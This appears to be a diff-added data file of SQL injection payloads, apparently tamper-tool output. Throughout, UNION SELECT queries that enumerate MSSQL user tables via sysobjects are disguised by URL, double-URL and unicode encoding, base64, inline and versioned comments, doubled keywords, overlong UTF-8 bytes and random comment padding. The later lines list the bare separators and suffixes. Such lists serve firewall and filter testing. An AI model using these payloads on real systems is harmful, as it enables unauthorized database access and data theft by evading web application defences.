+1+union+all+select+1,2,3,4,5,6,name+from+sysobjects+where+xtype+=+'u'+--
+
+1%0Aunion%0Call%0Cselect%0A1,2,3,4,5,6,name%0Afrom%0Csysobjects%0Awhere%0Dxtype%09=%0C'u'%0C--
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = %bf%27u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+%00
+MSB1bmkvKiovb24gc2VsZWN0IGFsbCBmcm9tIHdoZXJlCg==
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+%2531%2520%2575%256E%2569%252F%252A%252A%252F%256F%256E%2520%2573%2565%256C%2565%2563%2574%2520%2561%256C%256C%2520%2566%2572%256F%256D%2520%2577%2568%2565%2572%2565%250A
+%31%20%75%6E%69%2F%2A%2A%2F%6F%6E%20%73%65%6C%65%63%74%20%61%6C%6C%20%66%72%6F%6D%20%77%68%65%72%65%0A
+%u0031%u0020%u0075%u006E%u0069%u002F%u002A%u002A%u002F%u006F%u006E%u0020%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0061%u006C%u006C%u0020%u0066%u0072%u006F%u006D%u0020%u0077%u0068%u0065%u0072%u0065%u000A
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 /*!30733uni*//**/on select all from where
+
+1 /*!00000uni*//**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on SSELECTELECT all FRFROMOM WHWHEREERE
+
+1%C0%AAuni%C0%AF%C0%AA%C0%AA%C0%AFon%C0%AAselect%C0%AAall%C0%AAfrom%C0%AAwhere%C0%8A
+%1 %u%n%i%/%*%*%/%o%n %s%e%l%e%c%t %a%l%l %f%r%o%m %w%h%e%r%e%
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+ and '0having'='0having'
+1 uni/**/on select all from where
+-- sp_password
+1/**/uni/**/on/**/select/**/all/**/from/**/where
+
+1--qNcwOWIixZop%0Auni/**/on--OXcuya%0Aselect--wuJqyTwOAG%0Aall--GLedcpy%0Afrom--rAvjAS%0Awhere--ntyfYIOdq%0A
+1%23xHZcja%0Auni/**/on%23ubpPXswvVpd%0Aselect%23cSPytLxfgL%0Aall%23xlaZqwCe%0Afrom%23gZJedpydXGDS%0Awhere%23InxPQPjV%0A
+1%23mjrXfz%0Auni/**/on%23psuQRwY%0Aselect%23PQxewAUvRWFd%0Aall%23dOYjzlb%0Afrom%23ntdaHTu%0Awhere%23xjbwtO%0A
+1%01uni/**/on%0Cselect%03all%06from%03where
+
+1%23%0Auni/**/on%23%0Aselect%23%0Aall%23%0Afrom%23%0Awhere%23%0A
+1%0Duni/**/on%0Dselect%09all%09from%0Awhere
+
+1--%0Auni/**/on--%0Aselect--%0Aall--%0Afrom--%0Awhere--%0A
+1+uni/**/on+select+all+from+where
+
+1%09uni/**/on%0Dselect%0Dall%0Afrom%09where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+1 uni/**/on select all from where
+
+
+
+
+
+
+%00
+Cg==
+
+
+
+
+%250A
+%0A
+%u000A
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+%C0%8A
+%
+
+
+
+
+
+
+ and '0having'='0having'
+
+-- sp_password
+/**/
+--kxGsjYkGuI%0A
+%23voGhEA%0A
+%23KgJQNe%0A
+%0C
+%23%0A
+%09
+--%0A
++
+%0D
+
+
+
+
+
+
+
+
+
+
+
+
